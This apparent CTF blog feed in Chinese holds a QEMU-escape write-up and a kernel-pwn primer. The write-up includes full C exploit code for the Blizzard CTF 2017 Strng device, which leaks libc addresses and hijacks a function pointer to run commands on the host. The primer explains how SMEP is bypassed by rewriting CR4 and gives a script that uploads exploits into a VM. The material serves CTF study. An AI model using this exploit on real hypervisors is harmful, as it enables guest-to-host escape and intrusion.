class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *mmio_path = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">arb_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arb_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, addr);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;iopl failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mmap device mmio space</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span> ((fd=open(mmio_path, O_RDWR|O_SYNC)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open device mmio failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $ python3</span></span><br><span class="line"><span class="comment">    &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">    &gt;&gt;&gt; list(map(hex, unpack_many(b&quot;cat /root/flag  &quot;)))   # string align with 4</span></span><br><span class="line"><span class="comment">    [&#x27;0x20746163&#x27;, &#x27;0x6f6f722f&#x27;, &#x27;0x6c662f74&#x27;, &#x27;0x20206761&#x27;]</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    mmio_write(<span class="number">0x8</span>, <span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write(<span class="number">0xc</span>, <span class="number">0x6f6f722f</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">0x6c662f74</span>);</span><br><span class="line">    mmio_write(<span class="number">0x14</span>, <span class="number">0x20206761</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mmio_write(0x8, 0x20006873);    // system(&quot;sh&quot;); freeze after print &quot;sh: turning off NDELAY mode&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> srand_addr = arb_read(<span class="number">0x108</span>);</span><br><span class="line">    srand_addr = (arb_read(<span class="number">0x104</span>) | (srand_addr&lt;&lt;<span class="number">32</span>));</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = srand_addr + <span class="number">0xac50</span>;</span><br><span class="line"></span><br><span class="line">    arb_write(<span class="number">0x114</span>, system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0xc</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>打印struct偏移</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> <span class="built_in">print</span> (int)&amp;((STRNGState*)0)-&gt;srand</span></span><br><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> ptype /o STRNGState</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> dt STRNGState</span></span><br></pre></td></tr></table></figure><p>pahole导出elf中的structs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install dwarves</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pahole -V qemu-system-x86_64 &gt; structs  <span class="comment"># 导出并不完全，STRNGState不会被找到，是因为typedef的原因？</span></span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>要做出来STRNG这道题目，很关键的一点就是发现STRNGState结构体，知道了这个，那几个read、write函数就没有那么抽象了，漏洞也很清晰明了，所以这是很关键的问题。但是我看的几个WriteUp都没有说如何确定的这个结构。这可能就是比赛时solves: 0的原因吧。</p><p>尝试一：以state为关键字，在ida的structures标签页中搜索结构体，搜不到。</p><p>尝试二：使用pahole导出struct，也没有</p><p>后来看源码发现这个结构体是被<code>typedef</code>成了STRNDState的名字，本身并没有名字，这是不是上面找不到的原因？</p><p>(PS: disqus判定评论是否为spam的检查太垃圾了，在raycp大佬文章下面发了两个评论询问这个问题，都被这个gdx屏蔽了)</p><br /><p>前期花了太多的时间想彻底搞明白qemu虚拟设备的创建(经常会有这种莫名的强迫症…)，但是看来看去都模模糊糊的，是真的菜啊我。察觉这个状态后，想起教主的“先干起来，慢慢补充”，才继续关注题目本身。其实看两个简单的虚拟设备例子，做这个题目就没问题了。</p><blockquote><p>2020-11-28</p><p>在ida的local types窗口可以检索到STRNGState</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge">qemu-pwn-基础知识</a></li><li><a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup">qemu pwn-Blizzard CTF 2017 Strng writeup</a></li><li><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html">BlizzardCTF 2017 - Strng</a></li><li><a href="https://wiki.osdev.org/PCI#Base_Address_Registers">osdev PCI BAR</a></li><li><a href="https://www.cnblogs.com/machangwei-8/p/10403495.html">lspci命令详解</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近想学一下qemu escape的基础知识，进而分析一些Qemu的CVE漏洞。&lt;/p&gt;
&lt;p&gt;本文主要参考raycp师傅的两篇文章。[1] [2]&lt;/p&gt;
&lt;h2 id=&quot;Qemu概述&quot;&gt;&lt;a href=&quot;#Qemu概述&quot; class=&quot;headerlink&quot; title=&quot;Qemu概述&quot;&gt;&lt;/a&gt;Qemu概述&lt;/h2&gt;&lt;p&gt;每个运行的qemu虚拟机对应于host上的一个进程，虚拟机的执行线程（如CPU线程、I/O线程等）对应于qemu进程中的一个线程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/clxsh/pics/master/imgqemu-architecture.png&quot; alt=&quot;qemu-architecture&quot;&gt;&lt;/p&gt;
&lt;p&gt;qemu的内存结构，根据&lt;a href=&quot;http://www.phrack.org/papers/vm-escape-qemu-case-study.html&quot;&gt;QEMU Case Study&lt;/a&gt;，虚拟机对应的内存结构为如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;                        Guest&amp;#39; processes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                     +--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Virtual addr space   |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                     +--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                     |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                     \__   Page Table     \__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        \                    \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                         |                    |  Guest kernel&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----+--------------------+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Guest&amp;#39;s phy. memory |    |                    |                |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----+--------------------+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                                          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    \__                                        \__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       \                                          \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        |             QEMU process                 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                   +----+------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Virtual addr space |    |                                          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                   +----+------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                   |                                               |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    \__                Page Table                   \__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       \                                               \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        |                                               |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                   +----+-----------------------------------------------++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Physical memory    |    |                                               ||&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                   +----+-----------------------------------------------++&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="Qemu" scheme="http://hhdx.xyz/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>Kernel Pwn: 从入门到入土</title>
    <link href="http://hhdx.xyz/2020/10/25/Kernel-Pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"/>
    <id>http://hhdx.xyz/2020/10/25/Kernel-Pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</id>
    <published>2020-10-25T11:12:40.000Z</published>
    <updated>2020-11-19T11:05:36.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="内核文件区别"><a href="#内核文件区别" class="headerlink" title="内核文件区别"></a>内核文件区别</h3><p><code>vmlinux</code> 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。</p><p><code>vmlinuz</code> 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Decompressing Linux... done</span><br><span class="line">Booting the kernel.</span><br></pre></td></tr></table></figure><p><code>zImage</code> 是经过压缩的小内核（小于512KB）。</p><p><code>bzImage</code> 是经过压缩的大内核（大于512KB）。</p><h3 id="Initial-Ramdisk"><a href="#Initial-Ramdisk" class="headerlink" title="Initial Ramdisk"></a>Initial Ramdisk</h3><p>名字类似<code>initramfs.cpio</code> 文件，一般可以使用cpio读取其中的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . | cpio -o --format=newc &gt; initramfs.cpio <span class="comment"># compress</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cpio -idmv &lt; initramfs.cpio <span class="comment"># depress</span></span></span><br></pre></td></tr></table></figure><p>有时也经过了gzip的压缩。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv initramfs.cpio initramfs.cpio.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gunzip initramfs.cpio.gz<span class="comment"># 解压得到initramfs.cpio</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cpio -idmv &lt; initramfs.cpio</span></span><br></pre></td></tr></table></figure><p>更改为正确的后缀之后，图形界面“归档管理器”也可以打开。</p><a id="more"></a><p><span id="jump1"></span></p><h2 id="Compile-kernel"><a href="#Compile-kernel" class="headerlink" title="Compile kernel"></a>Compile kernel</h2><p>Host: Ubuntu 20.04</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.72.tar.xz <span class="comment"># get link from kernel.org</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> xz -d -v linux-5.4.72.tar.xz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar xvf linux-5.4.72.tar</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> linux-5.4.72</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp -v /boot/config-$(uname -r) .config</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make menuconfig <span class="comment"># optional, 此项设置好之后除非必要，尽量不要改动，否则会完全的重新编译</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make <span class="comment"># make -j $(nproc)</span></span></span><br></pre></td></tr></table></figure><h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-m 指定内存大小</span><br><span class="line">-nographic 没有图形界面，同时影响串并口</span><br><span class="line">-kernel 指定启动内核</span><br><span class="line">-machine 选择模拟的机器 -machine help显示所有</span><br><span class="line">    -accel 选择加速，有kvm、xen等等</span><br><span class="line">-append 添加内核启动选项</span><br><span class="line">-monitor 重定向monitor到主机设备，图形模式默认到vc，非图形模式默认到stdio</span><br><span class="line">-fsdev 定义一个新的文件系统设备</span><br><span class="line">    与-device virtio-9t-同用</span><br><span class="line">    -device virtio-9p-type,fsdev&#x3D;id,mount_tag&#x3D;mount_tag</span><br><span class="line">-enable-kvm 启用kvm全虚拟化支持</span><br><span class="line">-initrd 将文件用作起始ram disk</span><br><span class="line">-hda&#x2F;b&#x2F;c&#x2F;d 将文件用作硬盘0&#x2F;1&#x2F;2&#x2F;3</span><br><span class="line">-snapshot 写入临时文件，而不是映像文件。（可以强制写回</span><br></pre></td></tr></table></figure><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>使用qemu的<code>-s</code>选项，默认将会在1234端口开启gdb server。如果 1234 号端口用不了，也可以换成 -gdb tcp::[port num]</p><p>加断点的话，CTRL+C打断 gdb，输入就行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lsmod <span class="comment"># 查看加载的模块</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /sys/module/basic1_ch1/sections/.text <span class="comment"># 依次获取.text .bss .data加载地址</span></span></span><br><span class="line"><span class="meta">(gdb)$</span><span class="bash"> target remote :1234 <span class="comment"># 连接到本地调试端口</span></span></span><br><span class="line"><span class="meta">(gdb)$</span><span class="bash"> add-symbol-file ./tostring.ko 0xc3827000 -s .bss 0xc3827600 -s .data 0xc3827360 <span class="comment"># 在gdb中加载符号</span></span></span><br></pre></td></tr></table></figure><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h3 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h3><p>全称Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)。</p><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgCR4.jpg" alt="CR4"></p><p>CR4 寄存器是可以通过 mov 指令修改的。从vmlinux中提取gadget，可以达到这个目的。</p><p>gdb无法查看CR4寄存器的值，可以通过kernel crash时的信息来查看。关闭SMEP保护，常用一个固定的值0x6f0,即<code>mov cr4, 0x6f0</code>。</p><h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>Superivisor Mode Access Protection，类似于 SMEP，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</p><h3 id="MMAP-MIN-ADDR"><a href="#MMAP-MIN-ADDR" class="headerlink" title="MMAP_MIN_ADDR"></a>MMAP_MIN_ADDR</h3><ul><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li></ul><h2 id="upload脚本"><a href="#upload脚本" class="headerlink" title="upload脚本"></a>upload脚本</h2><p>用于将poc或exp上传到主机。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&quot;$ &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;stty -echo&quot;</span>)    <span class="comment"># 关闭回显</span></span><br><span class="line">    os.system(<span class="string">&quot;gcc -static -m32 -O2 ./&#123;&#125;.c -o &#123;&#125;&quot;</span>.format(name, name)) <span class="comment"># 普通gcc编译。musl-gcc编译32bit出错</span></span><br><span class="line">    os.system(<span class="string">&quot;gzip -c &#123;&#125; &gt; &#123;&#125;.gz&quot;</span>.format(name, name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;&#123;&#125;.gz&quot;</span>.format(name), <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;len: %d&quot;</span> % len(content))</span><br><span class="line">    encoded = base64.b64encode(content)</span><br><span class="line">    print(<span class="string">&quot;len: %d&quot;</span> % len(encoded))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">1000</span>):    <span class="comment"># 文件过大会出现上传不完整，后来改成1000就可以</span></span><br><span class="line">        io.sendline(<span class="string">&quot;echo \&quot;&#123;&#125;\&quot; &gt;&gt; &#123;&#125;.gz.b64&quot;</span>.format(encoded[i:i+<span class="number">1000</span>].decode(<span class="string">&quot;ascii&quot;</span>), name) )</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;base64 -d &#123;&#125;.gz.b64 &gt; &#123;&#125;.gz&quot;</span>.format(name, name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;gunzip &#123;&#125;.gz&quot;</span>.format(name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;chmod +x &#123;&#125;&quot;</span>.format(name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;./&#123;&#125;&quot;</span>.format(name))</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./._start_vm&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">upload(<span class="string">&quot;poc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># session = ssh(USER, HOST, PORT, PW) # ssh连接的情况</span></span><br><span class="line"><span class="comment"># io = session.run(&quot;/bin/sh&quot;)</span></span><br></pre></td></tr></table></figure><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="Loadable-Kernel-Modules-LKMs-3"><a href="#Loadable-Kernel-Modules-LKMs-3" class="headerlink" title="Loadable Kernel Modules(LKMs)[3]"></a>Loadable Kernel Modules(LKMs)[3]</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgLKM.jpg" alt="LKM"></p><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><ol><li><strong>insmod</strong>: 将指定模块加载到内核中。</li><li><strong>rmmod</strong>: 从内核中卸载指定模块。</li><li><strong>lsmod</strong>: 列出已经加载的模块。</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系。</li></ol><h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</strong></p><p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。例如：</p><table><thead><tr><th align="center">Events</th><th align="center">User functions</th><th align="center">Kernel functions</th></tr></thead><tbody><tr><td align="center">load</td><td align="center">insmod</td><td align="center">module_init()</td></tr><tr><td align="center">open</td><td align="center">fopen</td><td align="center">file_operations: open</td></tr><tr><td align="center">read</td><td align="center">fread</td><td align="center">file_operations: read</td></tr><tr><td align="center">write</td><td align="center">fwrite</td><td align="center">file_operations: write</td></tr><tr><td align="center">close</td><td align="center">fclose</td><td align="center">file_operations: 